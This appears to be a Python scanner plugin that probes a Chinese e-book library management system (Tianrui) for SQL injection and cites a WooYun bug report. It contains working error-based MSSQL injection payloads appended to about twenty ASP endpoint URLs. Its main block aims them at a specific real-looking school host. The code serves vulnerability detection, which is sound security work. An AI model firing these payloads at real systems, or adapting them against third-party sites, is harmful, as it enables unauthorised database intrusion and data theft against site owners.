#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 天睿电子图书管理系统多处SQL注入
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2010-0121549
description:
'''

def assign(service, arg):
    if service == 'tianrui_lib':
        return True, arg

def audit(arg):
    urls = [
        arg + 'gl_bofangdell.asp?id=11',
        arg + 'gl_xiu.asp?id=1',
        arg + 'gl_shan.asp?id=1',
        arg + 'gl_fl_xiu.asp?id=1',
        arg + 'gl_fl_shan.asp?id=1',
        
        arg + 'gl_fl_xiu2.asp?id=1',
        arg + 'gl_gydell.asp?id=1',
        arg + 'gl_lj_shan.asp?id=1',
        arg + 'gl_pl_shen.asp?id=55',
        arg + 'gl_pl_shan.asp?id=1',
        
        arg + 'gl_pl_shan.asp?id=1',
        arg + 'gl_tj_1.asp?id=1',
        arg + 'gl_tj_2.asp?id=1',
        arg + 'gl_tz_shan.asp?id=1',
        arg + 'gl_tz_xian.asp?id=1',
        
        arg + 'gl_us_shan.asp?id=23',
        arg + 'gl_xiu.asp?id=23',
        arg + 'gl_xiu2.asp?id=23',
        arg + 'down.asp?id=1'
    ]
    for url in urls:
        url += '%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)'
        code, head, res, err, _ = curl.curl2(url)
        if((code == 200) or (code == 500)) and ('WtFaBcMicrosoft SQL Server' in res):
            security_hole("SQL Injection: " + url)
    url = arg + 'gl_tz_she.asp?zt=11%20WHERE%201=1%20AND%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)--'
    code, head, res, err, _ = curl.curl2(url)
    if ((code == 200) or (code == 500)) and ('WtFaBcMicrosoft SQL Server' in res):
        security_hole("SQL Injection: " + url)
if __name__ == '__main__':
    from dummy import *
    audit(assign('tianrui_lib', 'http://lsxnmxx.js.cn:41516/tushu/')[1])
    #audit(assign('', '')[1])
